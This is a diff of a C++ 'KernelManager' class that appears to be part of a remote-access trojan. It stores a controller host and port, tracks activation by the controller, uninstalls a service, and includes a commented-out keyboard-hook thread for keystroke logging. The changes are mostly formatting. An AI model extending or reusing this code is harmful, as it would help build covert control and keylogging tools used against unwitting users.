@@ -1,48 +1,49 @@
-// KernelManager.cpp: implementation of the CKernelManager class.
-//
-//////////////////////////////////////////////////////////////////////
-
-
 #include "KernelManager.h"
 #include "loop.h"
 #include "until.h"
 //#include "inject.h"
 
-//////////////////////////////////////////////////////////////////////
-// Construction/Destruction
-//////////////////////////////////////////////////////////////////////
-
 char	CKernelManager::m_strMasterHost[256] = {0};
 UINT	CKernelManager::m_nMasterPort = 80;
-CKernelManager::CKernelManager(CClientSocket *pClient, LPCTSTR lpszServiceName, DWORD dwServiceType, LPCTSTR lpszKillEvent, 
-		LPCTSTR lpszMasterHost, UINT nMasterPort) : CManager(pClient)
+
+CKernelManager::CKernelManager(CClientSocket *pClient, LPCTSTR lpszServiceName, DWORD dwServiceType,
+							   LPCTSTR lpszKillEvent, 
+							   LPCTSTR lpszMasterHost, 
+							   UINT nMasterPort) : CManager(pClient)
 {
 	if (lpszServiceName != NULL)
 	{
 		lstrcpy(m_strServiceName, lpszServiceName);
 	}
+
 	if (lpszKillEvent != NULL)
+	{
 		lstrcpy(m_strKillEvent, lpszKillEvent);
+	}
+
 	if (lpszMasterHost != NULL)
+	{
 		lstrcpy(m_strMasterHost, lpszMasterHost);
+	}
 
 	m_nMasterPort = nMasterPort;
 	m_dwServiceType = dwServiceType;
 	m_nThreadCount = 0;
+
 	// 初次连接，控制端发送命令表始激活
 	m_bIsActived = TRUE;
+
 	// 创建一个监视键盘记录的线程
 	// 键盘HOOK跟UNHOOK必须在同一个线程中
 	//m_hThread[m_nThreadCount++] = 
 	//	MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)Loop_HookKeyboard, NULL, 0,	NULL, true);
-
 }
 
 CKernelManager::~CKernelManager()
 {
 	for(int i = 0; i < m_nThreadCount; i++)
 	{
-		TerminateThread(m_hThread[i], -1);
+		TerminateThread(m_hThread[i], -1); // todo:太危险 应该让线程自动退出
 		CloseHandle(m_hThread[i]);
 	}
 }
@@ -152,5 +153,5 @@ void CKernelManager::UnInstallService()
 
 bool CKernelManager::IsActived()
 {
-	return	m_bIsActived;	
+	return	m_bIsActived;
 }
